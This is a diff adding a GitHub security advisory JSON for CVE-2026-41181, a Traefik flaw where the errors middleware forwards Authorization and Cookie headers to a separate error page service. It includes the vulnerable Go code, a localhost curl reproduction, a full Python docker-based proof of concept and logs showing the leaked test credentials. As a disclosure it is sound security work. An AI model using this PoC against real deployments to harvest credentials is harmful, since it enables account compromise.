@@ -1,0 +1,106 @@
+{
+  "id": "GHSA-p6hg-qh38-555r",
+  "modified": "2026-05-05T16:12:56.183678Z",
+  "published": "2026-05-04T19:26:33Z",
+  "aliases": [
+    "CVE-2026-41181"
+  ],
+  "summary": "Traefik's errors middleware forwards Authorization and Cookie headers to separate error page service",
+  "details": "## Summary\n\nThere is a medium severity information disclosure vulnerability in Traefik's `errors` (custom error pages) middleware. When the backend returns a response matching the configured status range, the middleware forwards the original request's complete header set, including `Authorization`, `Cookie`, and other authentication material, to the separate error page service rather than only the minimal context needed to render the error page. This behavior is undocumented: the documentation states only that `Host` is forwarded by default, so operators are not warned that sensitive credentials are shared across service boundaries. Deployments using the `errors` middleware with a distinct error page service may inadvertently expose end-user credentials to infrastructure that was not intended to receive them.\n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.11.44\n- https://github.com/traefik/traefik/releases/tag/v3.6.15\n- https://github.com/traefik/traefik/releases/tag/v3.7.0-rc.3\n\n## For more information\n\nIf there are any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n\u003cdetails\u003e\n\u003csummary\u003eOriginal Description\u003c/summary\u003e\n\n## Description\nTraefik v3.6.13's supported HTTP `errors` middleware discloses sensitive request headers to the configured error page service when the original backend response matches the configured status range and the middleware takes its default header-forwarding path. In the reproduced configuration, the business router `audit-customerrors@docker` pointed to backend service `audit-backend`, attached middleware `audit-leak@docker`, and the middleware was configured with `errors.status=500-599`, `errors.service=audit-error`, and `errors.query=/collect`. A request to the business route caused the backend to return `500`, after which Traefik created a secondary request to the error service and copied the original `Authorization` and `Cookie` headers into that cross-service request.\n\nThis is a normal feature path on an ordinary HTTP route. It does not depend on `api.insecure`, the dashboard, pprof, or a debug-only mode. The confidentiality boundary that breaks here is the service boundary between the original backend chain and the separate error page service: credentials that were only meant for the original backend are automatically delivered to another service.\n\nThe root cause is in `pkg/middlewares/customerrors/custom_errors.go:151-160`:\n\n```go\nif len(c.forwardNginxHeaders) \u003e 0 {\n    utils.CopyHeaders(pageReq.Header, c.forwardNginxHeaders)\n    pageReq.Header.Set(\"X-Code\", strconv.Itoa(code))\n    pageReq.Header.Set(\"X-Format\", req.Header.Get(\"Accept\"))\n    pageReq.Header.Set(\"X-Original-Uri\", req.URL.RequestURI())\n} else {\n    utils.CopyHeaders(pageReq.Header, req.Header)\n}\n```\n\nUnless the `NginxHeaders` branch is explicitly used, the middleware copies the entire original request header map into the error page request. The documentation at `docs/content/reference/routing-configuration/http/middlewares/errorpages.md:103-107` only states that `Host` is forwarded by default, so operators are not warned that `Authorization`, `Cookie`, and other authentication material are forwarded as well.\n\n## Steps To Reproduce\n1. Deploy Traefik v3.6.13 with a normal business route that uses the supported `errors` middleware and points `errors.service` to a distinct service. The attached PoC uses `BASE_URL = \"http://127.0.0.1:28080\"`, `API_BASE_URL = \"http://127.0.0.1:28180\"`, `ROUTER_PATH = \"/audit-customerrors\"`, `AUTHORIZATION = \"Bearer audit-secret-token\"`, and `COOKIE = \"sessionid=audit-cookie; theme=dark\"`.\n\n2. Start the two attached helper services `customerrors_backend.py` and `customerrors_error.py`. The backend listens on port `8000` and always returns `500`. The error service listens on port `8000` and returns the request method, path, and received headers as JSON. The PoC starts them with the router and middleware labels below so that the business request is handled by the backend, while the error page is fetched from the separate error service:\n\n```text\ntraefik.http.routers.audit-customerrors.rule=PathPrefix(`/audit-customerrors`)\ntraefik.http.routers.audit-customerrors.entrypoints=web\ntraefik.http.routers.audit-customerrors.priority=100\ntraefik.http.routers.audit-customerrors.service=audit-backend\ntraefik.http.routers.audit-customerrors.middlewares=audit-leak\ntraefik.http.services.audit-backend.loadbalancer.server.port=8000\ntraefik.http.middlewares.audit-leak.errors.status=500-599\ntraefik.http.middlewares.audit-leak.errors.service=audit-error\ntraefik.http.middlewares.audit-leak.errors.query=/collect\n```\n\n3. Confirm that Traefik has loaded the route and middleware. The attached `customerrors_router.json` shows that `audit-customerrors@docker` uses middleware `audit-leak@docker`, and the attached `customerrors_middleware.json` shows that the middleware is enabled with `status` `500-599`, `service` `audit-error`, and `query` `/collect`.\n\n4. Send a request containing sensitive credentials through the business route. The manual reproduction used the following request, and the automated PoC sends the same header values:\n\n```bash\ncurl -i \\\n  -H 'Authorization: Bearer audit-secret-token' \\\n  -H 'Cookie: sessionid=audit-cookie; theme=dark' \\\n  http://127.0.0.1:28080/audit-customerrors\n```\n\n5. Observe that the backend returns `500`, Traefik internally requests `/collect` from the error service, and the error service receives the original `Authorization` and `Cookie` headers. The attached `manual_curl_customerrors.txt` response shows the leaked headers directly, and the attached `poc_customerrors_header_leak.output.txt` execution log shows the same result from the automated PoC.\n\n## Recommendations\nThe default behavior should forward only the minimal context needed to render an error page instead of copying the full original header set with `utils.CopyHeaders(pageReq.Header, req.Header)`. At minimum, Traefik should strip `Authorization`, `Proxy-Authorization`, `Cookie`, `Set-Cookie`, and common custom authentication headers such as `X-Api-Key` before issuing the error page request. If operators truly need additional headers, that behavior should be opt-in through an explicit allowlist rather than the default. The documentation should also describe the current behavior and warn that routing an error page to a separate service can otherwise disclose end-user credentials across service boundaries.\n\n## PoC\nThe main PoC attachment is `poc_customerrors_header_leak.py`.\n\n```python\nimport json\nimport os\nimport subprocess\nimport sys\nimport time\nimport urllib.error\nimport urllib.request\nfrom pathlib import Path\n\n\nTARGET = \"traefik customErrors sensitive header leak\"\nBASE_URL = \"http://127.0.0.1:28080\"\nAPI_BASE_URL = \"http://127.0.0.1:28180\"\nTRAEFIK_CONTAINER = \"traefik-openclaw\"\nNETWORK = \"\"\nDOCKER_IMAGE = \"python:3.12-alpine\"\nBACKEND_CONTAINER = \"traefik-audit-backend\"\nERROR_CONTAINER = \"traefik-audit-error\"\nROUTER_NAME = \"audit-customerrors\"\nROUTER_PATH = \"/audit-customerrors\"\nAUTHORIZATION = \"Bearer audit-secret-token\"\nCOOKIE = \"sessionid=audit-cookie; theme=dark\"\nTIMEOUT_SECONDS = 10\nROUTER_WAIT_SECONDS = 20\n\nEVIDENCE_DIR = Path(__file__).resolve().parent\nBACKEND_SCRIPT = EVIDENCE_DIR / \"customerrors_backend.py\"\nERROR_SCRIPT = EVIDENCE_DIR / \"customerrors_error.py\"\n\n\ndef run_command(command):\n    print(f\"$ {' '.join(command)}\")\n    completed = subprocess.run(command, capture_output=True, text=True, check=True)\n    stdout = completed.stdout.strip()\n    stderr = completed.stderr.strip()\n    if stdout:\n        print(stdout)\n    if stderr:\n        print(stderr)\n    return stdout\n\n\ndef remove_container(name):\n    subprocess.run([\"docker\", \"rm\", \"-f\", name], capture_output=True, text=True)\n\n\ndef detect_network():\n    if NETWORK:\n        return NETWORK\n\n    output = run_command(\n        [\"docker\", \"inspect\", TRAEFIK_CONTAINER, \"--format\", \"{{json .NetworkSettings.Networks}}\"]\n    )\n    networks = json.loads(output)\n    network_names = sorted(networks.keys())\n    if not network_names:\n        raise RuntimeError(\"No docker network found for Traefik container\")\n    return network_names[0]\n\n\ndef ensure_image():\n    run_command([\"docker\", \"pull\", DOCKER_IMAGE])\n\n\ndef start_error_container(network_name):\n    run_command(\n        [\n            \"docker\", \"run\", \"-d\", \"--name\", ERROR_CONTAINER,\n            \"--network\", network_name,\n            \"-v\", f\"{ERROR_SCRIPT}:/srv/error.py:ro\",\n            \"-l\", \"traefik.enable=true\",\n            \"-l\", f\"traefik.docker.network={network_name}\",\n            \"-l\", \"traefik.http.services.audit-error.loadbalancer.server.port=8000\",\n            DOCKER_IMAGE, \"python\", \"/srv/error.py\",\n        ]\n    )\n\n\ndef start_backend_container(network_name):\n    run_command(\n        [\n            \"docker\", \"run\", \"-d\", \"--name\", BACKEND_CONTAINER,\n            \"--network\", network_name,\n            \"-v\", f\"{BACKEND_SCRIPT}:/srv/backend.py:ro\",\n            \"-l\", \"traefik.enable=true\",\n            \"-l\", f\"traefik.docker.network={network_name}\",\n            \"-l\", f\"traefik.http.routers.{ROUTER_NAME}.rule=PathPrefix(`{ROUTER_PATH}`)\",\n            \"-l\", f\"traefik.http.routers.{ROUTER_NAME}.entrypoints=web\",\n            \"-l\", f\"traefik.http.routers.{ROUTER_NAME}.priority=100\",\n            \"-l\", f\"traefik.http.routers.{ROUTER_NAME}.service=audit-backend\",\n            \"-l\", f\"traefik.http.routers.{ROUTER_NAME}.middlewares=audit-leak\",\n            \"-l\", \"traefik.http.services.audit-backend.loadbalancer.server.port=8000\",\n            \"-l\", \"traefik.http.middlewares.audit-leak.errors.status=500-599\",\n            \"-l\", \"traefik.http.middlewares.audit-leak.errors.service=audit-error\",\n            \"-l\", \"traefik.http.middlewares.audit-leak.errors.query=/collect\",\n            DOCKER_IMAGE, \"python\", \"/srv/backend.py\",\n        ]\n    )\n\n\ndef fetch_json(url, headers=None):\n    request = urllib.request.Request(url, headers=headers or {}, method=\"GET\")\n    try:\n        response = urllib.request.urlopen(request, timeout=TIMEOUT_SECONDS)\n    except urllib.error.HTTPError as exc:\n        response = exc\n\n    with response:\n        return json.loads(response.read().decode())\n\n\ndef wait_for_router():\n    deadline = time.time() + ROUTER_WAIT_SECONDS\n    while time.time() \u003c deadline:\n        try:\n            data = fetch_json(f\"{API_BASE_URL}/api/rawdata\")\n            if f\"{ROUTER_NAME}@docker\" in data.get(\"routers\", {}):\n                return data\n        except Exception:\n            pass\n        time.sleep(1)\n    raise RuntimeError(\"Timed out waiting for router\")\n\n\ndef trigger_request():\n    headers = {\n        \"Authorization\": AUTHORIZATION,\n        \"Cookie\": COOKIE,\n    }\n    return fetch_json(f\"{BASE_URL}{ROUTER_PATH}\", headers=headers)\n\n\ndef validate(response_json):\n    leaked_headers = response_json.get(\"headers\", {})\n    leaked_auth = leaked_headers.get(\"Authorization\")\n    leaked_cookie = leaked_headers.get(\"Cookie\")\n\n    print(\"Response JSON:\")\n    print(json.dumps(response_json, indent=2, sort_keys=True))\n\n    if leaked_auth != AUTHORIZATION:\n        raise RuntimeError(f\"Authorization not leaked as expected, got: {leaked_auth!r}\")\n    if leaked_cookie != COOKIE:\n        raise RuntimeError(f\"Cookie not leaked as expected, got: {leaked_cookie!r}\")\n\n    print(\"Validation result: error page service received the original Authorization and Cookie.\")\n\n\ndef main():\n    print(f\"TARGET={TARGET}\")\n    network_name = detect_network()\n    print(f\"Using docker network: {network_name}\")\n\n    remove_container(BACKEND_CONTAINER)\n    remove_container(ERROR_CONTAINER)\n\n    try:\n        ensure_image()\n        start_error_container(network_name)\n        start_backend_container(network_name)\n        wait_for_router()\n        response_json = trigger_request()\n        validate(response_json)\n    finally:\n        remove_container(BACKEND_CONTAINER)\n        remove_container(ERROR_CONTAINER)\n        print(\"Cleaned up temporary containers.\")\n\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except subprocess.CalledProcessError as exc:\n        if exc.stdout:\n            print(exc.stdout)\n        if exc.stderr:\n            print(exc.stderr, file=sys.stderr)\n        raise\n```\n\nSupporting backend helper used by the PoC, from `customerrors_backend.py`:\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(500)\n        self.send_header(\"Content-Type\", \"text/plain; charset=utf-8\")\n        self.end_headers()\n        self.wfile.write(b\"backend forced 500\\n\")\n\n    def log_message(self, format, *args):\n        return\n\n\ndef main():\n    HTTPServer((\"0.0.0.0\", 8000), Handler).serve_forever()\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\nSupporting error service helper used by the PoC, from `customerrors_error.py`:\n\n```python\nimport json\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        body = json.dumps(\n            {\n                \"method\": self.command,\n                \"path\": self.path,\n                \"headers\": {key: value for key, value in self.headers.items()},\n            },\n            indent=2,\n            sort_keys=True,\n        ).encode()\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"application/json; charset=utf-8\")\n        self.send_header(\"Content-Length\", str(len(body)))\n        self.end_headers()\n        self.wfile.write(body)\n\n    def log_message(self, format, *args):\n        return\n\n\ndef main():\n    HTTPServer((\"0.0.0.0\", 8000), Handler).serve_forever()\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## Evidence Files\n`customerrors_middleware.json` proves that the active middleware is the supported `errors` middleware and that it was configured with `status` `500-599`, `service` `audit-error`, and `query` `/collect`.\n\n```json\n{\n    \"errors\": {\n        \"status\": [\n            \"500-599\"\n        ],\n        \"service\": \"audit-error\",\n        \"query\": \"/collect\"\n    },\n    \"status\": \"enabled\",\n    \"usedBy\": [\n        \"audit-customerrors@docker\"\n    ],\n    \"name\": \"audit-leak@docker\",\n    \"provider\": \"docker\",\n    \"type\": \"errors\"\n}\n```\n\n`customerrors_router.json` proves that the business router `audit-customerrors@docker` was enabled on the `web` entrypoint, routed to `audit-backend`, and used middleware `audit-leak@docker`.\n\n```json\n{\n    \"entryPoints\": [\n        \"web\"\n    ],\n    \"middlewares\": [\n        \"audit-leak@docker\"\n    ],\n    \"service\": \"audit-backend\",\n    \"rule\": \"PathPrefix(`/audit-customerrors`)\",\n    \"priority\": 100,\n    \"observability\": {\n        \"accessLogs\": true,\n        \"metrics\": true,\n        \"tracing\": true,\n        \"traceVerbosity\": \"minimal\"\n    },\n    \"status\": \"enabled\",\n    \"using\": [\n        \"web\"\n    ],\n    \"name\": \"audit-customerrors@docker\",\n    \"provider\": \"docker\",\n    \"priorityStr\": \"100\"\n}\n```\n\n`manual_curl_customerrors.txt` proves that a direct request through Traefik caused the separate error service to receive the original `Authorization` and `Cookie` values.\n\n```text\nHTTP/1.1 500 Internal Server Error\nContent-Length: 461\nContent-Type: application/json; charset=utf-8\nDate: Mon, 13 Apr 2026 13:09:58 GMT\nServer: BaseHTTP/0.6 Python/3.12.13\n\n{\n  \"headers\": {\n    \"Accept\": \"*/*\",\n    \"Accept-Encoding\": \"gzip\",\n    \"Authorization\": \"Bearer audit-secret-token\",\n    \"Cookie\": \"sessionid=audit-cookie; theme=dark\",\n    \"Host\": \"127.0.0.1:28080\",\n    \"User-Agent\": \"curl/8.7.1\",\n    \"X-Forwarded-Host\": \"127.0.0.1:28080\",\n    \"X-Forwarded-Port\": \"28080\",\n    \"X-Forwarded-Proto\": \"http\",\n    \"X-Forwarded-Server\": \"c231be677a1b\",\n    \"X-Real-Ip\": \"172.19.0.1\"\n  },\n  \"method\": \"GET\",\n  \"path\": \"/collect\"\n}\n```\n\n`poc_customerrors_header_leak.output.txt` is the automated execution log for the Python PoC. The source material provided the following excerpt from that output, which shows the same credential disclosure and the PoC's validation result.\n\n```text\nResponse JSON:\n{\n  \"headers\": {\n    \"Accept-Encoding\": \"identity\",\n    \"Authorization\": \"Bearer audit-secret-token\",\n    \"Cookie\": \"sessionid=audit-cookie; theme=dark\",\n    \"Host\": \"127.0.0.1:28080\",\n    \"User-Agent\": \"Python-urllib/3.14\",\n    \"X-Forwarded-Host\": \"127.0.0.1:28080\",\n    \"X-Forwarded-Port\": \"28080\",\n    \"X-Forwarded-Proto\": \"http\",\n    \"X-Forwarded-Server\": \"c231be677a1b\",\n    \"X-Real-Ip\": \"172.19.0.1\"\n  },\n  \"method\": \"GET\",\n  \"path\": \"/collect\"\n}\nValidation result: error page service received the original Authorization and Cookie.\n```\n\n## Impact\nAny deployment that uses the supported `errors` middleware with a separate error page service can silently copy end-user credentials to that second service whenever the configured error status range is triggered. In practice, this means bearer tokens, session cookies, and other custom authentication headers can be disclosed to infrastructure that was never meant to receive them. If the error service is maintained by a different team, shared across tenants, hosted by a third party, or simply logged more broadly than the primary application service, this expands the exposure of valid credentials and can enable unauthorized API access or account compromise depending on what the leaked tokens authorize.\n\n\u003c/details\u003e",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v2",
+        "purl": "pkg:golang/github.com/traefik/traefik/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.44"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.11.43",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-p6hg-qh38-555r/GHSA-p6hg-qh38-555r.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v3",
+        "purl": "pkg:golang/github.com/traefik/traefik/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.6.15"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.6.14",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-p6hg-qh38-555r/GHSA-p6hg-qh38-555r.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v3",
+        "purl": "pkg:golang/github.com/traefik/traefik/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.7.0-rc.0"
+            },
+            {
+              "fixed": "3.7.0-rc.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.7.0-rc.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-p6hg-qh38-555r/GHSA-p6hg-qh38-555r.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/security/advisories/GHSA-p6hg-qh38-555r"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/traefik/traefik"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v2.11.44"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v3.6.15"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v3.7.0-rc.3"
+    }
+  ]
+}
